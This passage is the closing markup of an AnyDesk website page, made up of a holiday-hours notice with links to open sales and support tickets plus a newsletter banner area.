	            	<button type="button" class="close " data-dismiss="modal" aria-label="Close" data-ref="">
	                <span aria-hidden="true"></span>
	                </button>
	            </div>
	            <div class="modal-body text-center">
	                <p>At AnyDesk, we want to provide the best experience and most innovative technology to all our users and customers. Our team will be operating on reduced holiday hours during this time.</p>
		<h5 class="red text-center">Click below to create a ticket.</h5>
		<div class="d-inline-block v-align-top mr-0 mr-md-2 mb-1">
			<a class="btn btn-sm btn-primary" href="/en/contact/sales">
	Sales</a></div>
		<div class="d-inline-block v-align-top">
			<a class="btn btn-sm btn-primary-outline" href="/en/contact/support">
	Support</a></div></div>
	        </div>
	    </div>
	</div>
</div>
			<style>.fadeout-stuttgart-opera-mobile-newsletter-jpg-hero-img {
        background-image: url(../../../_static/img/hero/fadeout-stuttgart-opera-mobile-newsletter.jpg);
    }</style>

<div class="  container-hero fadeout-stuttgart-opera-mobile-newsletter-jpg-hero-img">
    <div class="container">
        <div class="d-block pos-rel any-module-newsletter py-2 py-md-4 px-2">
	</div>
</div><footer>
	<div class="container container-footer d-block d-md-none">
		<div class="divider"></div>
		<div class="row">
			<div class="col-12 mb-3">
				<img src="/_static/img/logos/anydesk-logo-white-red-ec4e3a.png" class="footer-logo" alt="" title="AnyDesk logo">
	<div class="d-flex align-items-center mt-3">
						<!-- We can't show ZH-TW on the Language selector for Political reasons. Instead we set China language for ZH_TW -->
<select class="selectpicker language-select" data-width="fit">
	<option value="/en" data-lang="en" selected data-icon="flag-icon flag-icon-en">
				English</option>
		<option value="/en-gb" data-lang="en-gb" data-icon="flag-icon flag-icon-en-gb">
				English</option>
		<option value="/en-au" data-lang="en-au" data-icon="flag-icon flag-icon-en-au">
				English</option>
		<option value="/de" data-lang="de" data-icon="flag-icon flag-icon-de">
				Deutsch</option>
		<option value="/fr" data-lang="fr" data-icon="flag-icon flag-icon-fr">
				Fran&#231;ais</option>
		<option value="/it" data-lang="it" data-icon="flag-icon flag-icon-it">
				Italiano</option>
		<option value="/es" data-lang="es" data-icon="flag-icon flag-icon-es">
				Espa&#241;ol</option>
		<option value="/pt" data-lang="pt" data-icon="flag-icon flag-icon-pt">
				Portugu&#234;s</option>
		<option value="/nl" data-lang="nl" data-icon="flag-icon flag-icon-nl">
				Nederlands</option>
		<option value="/pl" data-lang="pl" data-icon="flag-icon flag-icon-pl">
				Polski</option>
		<option value="/el" data-lang="el" data-icon="flag-icon flag-icon-el">
				&#917;&#955;&#955;&#951;&#957;&#953;&#954;&#940;</option>
		<option value="/tr" data-lang="tr" data-icon="flag-icon flag-icon-tr">
				T&#252;rk&#231;e</option>
		<option value="/ru" data-lang="ru" data-icon="flag-icon flag-icon-ru">
				&#1056;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;</option>
		<option value="/ja" data-lang="ja" data-icon="flag-icon flag-icon-ja">
				&#26085;&#26412;&#35486;</option>
		<option value="/zhs" data-lang="zhs" data-icon="flag-icon flag-icon-zhs">
				&#31616;&#20307;&#20013;&#25991;</option>
		<option value="/zht" data-lang="zht" data-icon="flag-icon flag-icon-zht">
				&#32321;&#39636;&#20013;&#25991;</option>
		<option value="/ko" data-lang="ko" data-icon="flag-icon flag-icon-ko">
				&#54620;&#44397;&#50612;</option>
		</select>
<img src="/_static/icons/red/bold/arrow-down-1-f86c19.svg" class="mr-2 mt-3px" width="15" alt="">
	</div>
				<div class="mt-3">
					<a class="d-block mb-2" href="https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid" target="_blank" rel="noopener noreferrer" download aria-label="Google Play">
	<img src="/_static/img/badges/google-play-badge-1338ed.svg" class="w-180px" alt="">
	</a><a class="d-block" href="https://itunes.apple.com/us/app/anydesk/id1176131273" target="_blank" rel="noopener noreferrer" download aria-label="iTunes">
	<img src="/_static/img/badges/app-store-badge-2f2fe1.svg" class="w-180px" alt="">
	</a></div>
			</div>
		</div>
		<div class="row">
			<div class="col-md-12">
				<div class="card-accordion card-accordion-dark">
					<div class="card">
						<div class="card-header card-header-accordion" data-toggle="collapse" href="#card-accordion-footer-menu1" aria-expanded="true" aria-controls="card-accordion-footer-menu1">
							<a class="card-link" data-toggle="collapse" href="#card-accordion-footer-menu1" aria-expanded="true" aria-controls="card-accordion-footer-menu1">Why AnyDesk<span class="collapsed"><span class="accordion-icon"><span class="font-size-lg red"></span></span></span>
								<span class="expanded"><span class="accordion-icon"><span class="font-size-lg red"></span></span></span>
							</a>
						</div>
						<div id="card-accordion-footer-menu1" class="collapse show">
							<div class="card-body">
								<a class="nav-link p-0 pb-1" href="/en/performance">
	Performance</a><a class="nav-link p-0 pb-1" href="/en/security">
	Security</a><a class="nav-link p-0 pb-1" href="/en/downloads">
	All Platforms</a><a class="nav-link p-0 pb-1" href="/en/customization">
	Customization</a><a class="nav-link p-0 pb-1" href="/en/case-studies">
	Case Studies</a><a class="nav-link p-0 pb-1" href="/en/features">
	Features</a></div>
						</div>
					</div>
					<div class="card">
						<div class="card-header card-header-accordion" data-toggle="collapse" href="#card-accordion-footer-menu2" aria-expanded="true" aria-controls="card-accordion-footer-menu2">
							<a class="card-link" data-toggle="collapse" href="#card-accordion-footer-menu2" aria-expanded="true" aria-controls="card-accordion-footer-menu2">Solutions<span class="collapsed"><span class="accordion-icon font-size-lg red"></span></span>
								<span class="expanded"><span class="accordion-icon font-size-lg red"></span></span>
							</a>
						</div>
						<div id="card-accordion-footer-menu2" class="collapse show">
							<div class="card-body">
								<a class="nav-link p-0 pb-1" href="/en/solutions/remote-desktop">
	Remote Desktop</a><a class="nav-link p-0 pb-1" href="/en/solutions/remote-support">
	Remote Support</a><a class="nav-link p-0 pb-1" href="/en/solutions/remote-work">
	Remote Work</a><a class="nav-link p-0 pb-1" href="/en/solutions/remote-access">
	Remote Access</a><a class="nav-link p-0 pb-1" href="/en/solutions/mobile-device-support">
	Mobile Device Support</a><a class="nav-link p-0 pb-1" href="/en/solutions/on-premises">
	Cloud &amp; On-Premises</a><a class="nav-link p-0 pb-1" href="/en/solutions/enterprise-solution">
	Ultimate Solution</a><a class="nav-link p-0 pb-1" href="/en/pricing">
	Buy Now</a><a class="nav-link p-0 pb-1" href="/en/downloads">
	Downloads</a></div>
						</div>
					</div>
					<div class="card">
						<div class="card-header card-header-accordion" data-toggle="collapse" href="#card-accordion-footer-menu3" aria-expanded="true" aria-controls="card-accordion-footer-menu3">
							<a class="card-link" data-toggle="collapse" href="#card-accordion-footer-menu3" aria-expanded="true" aria-controls="card-accordion-footer-menu3">Services<span class="collapsed"><span class="accordion-icon"><span class="font-size-lg red"></span></span></span>
								<span class="expanded"><span class="accordion-icon"><span class="font-size-lg red"></span></span></span>
							</a>
						</div>
						<div id="card-accordion-footer-menu3" class="collapse show">
							<div class="card-body">
								<a class="nav-link p-0 pb-1" href="/en/services">
	AnyDesk Services</a><a class="nav-link p-0 pb-1" href="/en/services/customer-success">
	Customer Success</a><a class="nav-link p-0 pb-1" href="https://support.anydesk.com/knowledge" target="_blank" rel="noopener noreferrer">
	Help Center<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a><a class="nav-link p-0 pb-1" href="https://my.anydesk.com" target="_blank" rel="noopener noreferrer">
	my.anydesk.com<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a><a class="nav-link p-0 pb-1" href="https://go.anydesk.com" target="_blank" rel="noopener noreferrer">
	go.anydesk.com<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a><a class="nav-link p-0 pb-1" href="/en/abuse-prevention">
	Abuse Prevention</a><a class="nav-link p-0 pb-1" href="https://status.anydesk.com/" target="_blank" rel="noopener noreferrer">
	System Status<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a><a class="nav-link p-0 pb-1" href="https://download.anydesk.com/changelog.txt" target="_blank" rel="noopener noreferrer">
	Changelog<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></div>
						</div>
					</div>
					<div class="card">
						<div class="card-header card-header-accordion" data-toggle="collapse" href="#card-accordion-footer-menu4" aria-expanded="true" aria-controls="card-accordion-footer-menu4">
							<a class="card-link" data-toggle="collapse" href="#card-accordion-footer-menu4" aria-expanded="true" aria-controls="card-accordion-footer-menu4">Company<span class="collapsed"><span class="accordion-icon"><span class="font-size-lg red"></span></span></span>
								<span class="expanded"><span class="accordion-icon"><span class="font-size-lg red"></span></span></span>
							</a>
						</div>
						<div id="card-accordion-footer-menu4" class="collapse show">
							<div class="card-body">
								<a class="nav-link p-0 pb-1" href="/en/leadership-team">
	AnyDesk Team</a><a class="nav-link p-0 pb-1" href="/en/support/contact-us">
	Contact</a><a class="nav-link p-0 pb-1" href="/en/career">
	Career</a><a class="nav-link p-0 pb-1" href="/en/career/jobs#collaboration">
	Open Positions</a><a class="nav-link p-0 pb-1" href="/en/partners">
	Partners</a><a class="nav-link p-0 pb-1" href="https://blog.anydesk.com/">
	Blog</a><a class="nav-link p-0 pb-1" href="/en/press">
	Press</a><a class="nav-link p-0 pb-1" href="/en/events">
	Events</a><a class="nav-link p-0 pb-1" href="https://anydesk.com/fanshop" target="_blank" rel="noopener noreferrer">
	Fanshop<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="divider"></div>
	</div>

	<div class="container container-footer d-none d-md-block">
		<div class="divider"></div>
		<div class="row">
			<div class="col-xl-4 mb-0 mb-md-3">
				<img src="/_static/img/logos/anydesk-logo-white-red-ec4e3a.png" class="footer-logo" alt="" title="AnyDesk logo">
	<div class="d-flex align-items-center footer-select mt-lg-3 mt-1">
						<!-- We can't show ZH-TW on the Language selector for Political reasons. Instead we set China language for ZH_TW -->
<select class="selectpicker language-select" data-width="fit">
	<option value="/en" data-lang="en" selected data-icon="flag-icon flag-icon-en">
				English</option>
		<option value="/en-gb" data-lang="en-gb" data-icon="flag-icon flag-icon-en-gb">
				English</option>
		<option value="/en-au" data-lang="en-au" data-icon="flag-icon flag-icon-en-au">
				English</option>
		<option value="/de" data-lang="de" data-icon="flag-icon flag-icon-de">
				Deutsch</option>
		<option value="/fr" data-lang="fr" data-icon="flag-icon flag-icon-fr">
				Fran&#231;ais</option>
		<option value="/it" data-lang="it" data-icon="flag-icon flag-icon-it">
				Italiano</option>
		<option value="/es" data-lang="es" data-icon="flag-icon flag-icon-es">
				Espa&#241;ol</option>
		<option value="/pt" data-lang="pt" data-icon="flag-icon flag-icon-pt">
				Portugu&#234;s</option>
		<option value="/nl" data-lang="nl" data-icon="flag-icon flag-icon-nl">
				Nederlands</option>
		<option value="/pl" data-lang="pl" data-icon="flag-icon flag-icon-pl">
				Polski</option>
		<option value="/el" data-lang="el" data-icon="flag-icon flag-icon-el">
				&#917;&#955;&#955;&#951;&#957;&#953;&#954;&#940;</option>
		<option value="/tr" data-lang="tr" data-icon="flag-icon flag-icon-tr">
				T&#252;rk&#231;e</option>
		<option value="/ru" data-lang="ru" data-icon="flag-icon flag-icon-ru">
				&#1056;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;</option>
		<option value="/ja" data-lang="ja" data-icon="flag-icon flag-icon-ja">
				&#26085;&#26412;&#35486;</option>
		<option value="/zhs" data-lang="zhs" data-icon="flag-icon flag-icon-zhs">
				&#31616;&#20307;&#20013;&#25991;</option>
		<option value="/zht" data-lang="zht" data-icon="flag-icon flag-icon-zht">
				&#32321;&#39636;&#20013;&#25991;</option>
		<option value="/ko" data-lang="ko" data-icon="flag-icon flag-icon-ko">
				&#54620;&#44397;&#50612;</option>
		</select>
<img src="/_static/icons/red/bold/arrow-down-1-13dd01.svg" class="mr-2 mt-3px" width="15" alt="">
	</div>
				</div>
			<div class="col-12 mb-0 mb-md-3 d-md-block d-lg-none">
				<a href="https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid" target="_blank" rel="noopener noreferrer" download aria-label="Google Play">
	<img src="/_static/img/badges/google-play-badge-1338ed.svg" class="w-180px mr-1" alt="">
	</a><a href="https://itunes.apple.com/us/app/anydesk/id1176131273" target="_blank" rel="noopener noreferrer" download aria-label="iTunes">
	<img src="/_static/img/badges/app-store-badge-2f2fe1.svg" class="w-180px" alt="">
	</a></div>
			<div class="col-xl-2 col-md-3">
				<p class="red mb-3 pb-2 font-size-md border-bottom-solid-primary">Why AnyDesk</p>
				<p><a class="any-link-textblock-white" href="/en/performance">
	Performance</a></p>
				<p><a class="any-link-textblock-white" href="/en/security">
	Security</a></p>
				<p><a class="any-link-textblock-white" href="/en/downloads">
	All Platforms</a></p>
				<p><a class="any-link-textblock-white" href="/en/customization">
	Customization</a></p>
				<p><a class="any-link-textblock-white" href="/en/case-studies">
	Case Studies</a></p>
				<p class="mb-0"><a class="any-link-textblock-white" href="/en/features">
	Features</a></p>
			</div>
			<div class="col-xl-2 col-md-3">
				<p class="red mb-3 pb-2 font-size-md border-bottom-solid-primary">Solutions</p>
				<p><a class="any-link-textblock-white" href="/en/solutions/remote-desktop">
	Remote Desktop</a></p>
				<p><a class="any-link-textblock-white" href="/en/solutions/remote-support">
	Remote Support</a></p>
				<p><a class="any-link-textblock-white" href="/en/solutions/remote-work">
	Remote Work</a></p>
				<p><a class="any-link-textblock-white" href="/en/solutions/remote-access">
	Remote Access</a></p>
				<p><a class="any-link-textblock-white" href="/en/solutions/mobile-device-support">
	Mobile Device Support</a></p>
				<p><a class="any-link-textblock-white" href="/en/solutions/on-premises">
	Cloud &amp; On-Premises</a></p>
				<p><a class="any-link-textblock-white" href="/en/solutions/enterprise-solution">
	Ultimate Solution</a></p>
				<p><a class="any-link-textblock-white" href="/en/pricing">
	Buy Now</a></p>
				<p class="mb-0"><a class="any-link-textblock-white" href="/en/downloads">
	Downloads</a></p>
			</div>
			<div class="col-xl-2 col-md-3">
				<p class="red mb-3 pb-2 font-size-md border-bottom-solid-primary">Services</p>
				<p><a class="any-link-textblock-white" href="/en/services">
	AnyDesk Services</a></p>
				<p><a class="any-link-textblock-white" href="/en/services/customer-success">
	Customer Success</a></p>
				<p><a class="any-link-textblock-white" href="https://support.anydesk.com/knowledge" target="_blank" rel="noopener noreferrer">
	Help Center<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></p>
				<p><a class="any-link-textblock-white" href="https://my.anydesk.com" target="_blank" rel="noopener noreferrer">
	my.anydesk.com<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></p>
				<p><a class="any-link-textblock-white" href="https://go.anydesk.com" target="_blank" rel="noopener noreferrer">
	go.anydesk.com<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></p>
				<p><a class="any-link-textblock-white" href="/en/abuse-prevention">
	Abuse Prevention</a></p>
				<p><a class="any-link-textblock-white" href="https://status.anydesk.com/" target="_blank" rel="noopener noreferrer">
	System Status<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></p>
				<p><a class="any-link-textblock-white" href="https://download.anydesk.com/changelog.txt" target="_blank" rel="noopener noreferrer">
	Changelog<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></p>
			</div>
			<div class="col-xl-2 col-md-3">
				<p class="red mb-3 pb-2 font-size-md border-bottom-solid-primary">Company</p>
				<p><a class="any-link-textblock-white" href="/en/leadership-team">
	AnyDesk Team</a></p>
				<p><a class="any-link-textblock-white" href="/en/support/contact-us">
	Contact</a></p>
				<p><a class="any-link-textblock-white" href="/en/career">
	Career</a></p>
				<p><a class="any-link-textblock-white" href="/en/career/jobs#collaboration">
	Open Positions</a></p>
				<p><a class="any-link-textblock-white" href="/en/partners">
	Partners</a></p>
				<p><a class="any-link-textblock-white" href="https://blog.anydesk.com/">
	Blog</a></p>
				<p><a class="any-link-textblock-white" href="/en/press">
	Press</a></p>
				<p><a class="any-link-textblock-white" href="/en/events">
	Events</a></p>
				<p class="mb-0"><a class="any-link-textblock-white" href="https://anydesk.com/fanshop" target="_blank" rel="noopener noreferrer">
	Fanshop<img src="/_static/icons/white/bold/keyboard-arrow-top-right-5f4184.svg" class="ml-0-1" width="10" alt="">
	</a></p>
					</div>
		</div>
		<div class="divider"></div>
	</div>
		
	<div class="container-footer-bottom">
		<div class="container">
			<div class="row justify-content-center align-items-center">
				<div class="col-lg-9 col-md-8 align-items-center">
					<p class="mb-0 font-size-xs">
						&#169; 2023 AnyDesk Software GmbH
						 &#8226;
						<a class="any-link-textblock-red" href="#">
	Terms &amp; Conditions</a> &#8226;
						<a class="any-link-textblock-red" href="#">
	Privacy Policy</a> &#8226;
						<a class="any-link-textblock-red" en/imprhref="#">
	Legal Notice</a></p>
				</div>
				<div class="col-lg-3 col-md-4">
					<a class="footer-social-icon-tt ml-1 mt-1" href="https://www.tiktok.com/@anydesksoftware" title="TikTok" target="_blank" rel="noopener noreferrer">
	</a><a class="footer-social-icon-tw ml-1 mt-1" href="https://twitter.com/anydesk" title="Twitter" target="_blank" rel="noopener noreferrer">
	</a><a class="footer-social-icon-rd ml-1 mt-1" href="https://www.reddit.com/r/AnyDesk/" title="reddit" target="_blank" rel="noopener noreferrer">
	</a><a class="footer-social-icon-yt ml-1 mt-1" href="https://www.youtube.com/channel/UCFkLwT67lnyruZWVw78-NjA" title="YouTube" target="_blank" rel="noopener noreferrer">
	</a><a class="footer-social-icon-li ml-1 mt-1" href="https://de.linkedin.com/company/anydesk-software-gmbh" title="LinkedIn" target="_blank" rel="noopener noreferrer">
	</a><a class="footer-social-icon-fb ml-1 mt-1" href="https://www.facebook.com/AnyDesk/" title="Facebook" target="_blank" rel="noopener noreferrer">
	</a><a class="footer-social-icon-ig ml-1 mt-1" href="https://www.instagram.com/anydesksoftware/" title="Instagram" target="_blank" rel="noopener noreferrer">
	</a></div>	
			</div>
		</div>
	</div>

	</footer>
</div>
		<script src="/_static/js/jquery-3.5.1.min-d2cc8d.js"></script>
		<script src="/_static/js/popper.min-60cc59.js"></script>
		<script src="/_static/js/bootstrap.min-0cc93b.js"></script>
		<script src="/_static/js/bootstrap-select/bootstrap-select.min-44f87f.js"></script>
		<script src="/_static/js/anydesk.min-7ce1ba.js"></script>

		<script src="/_static/js/slick.min-3b41b3.js"></script>
</body>
</html>
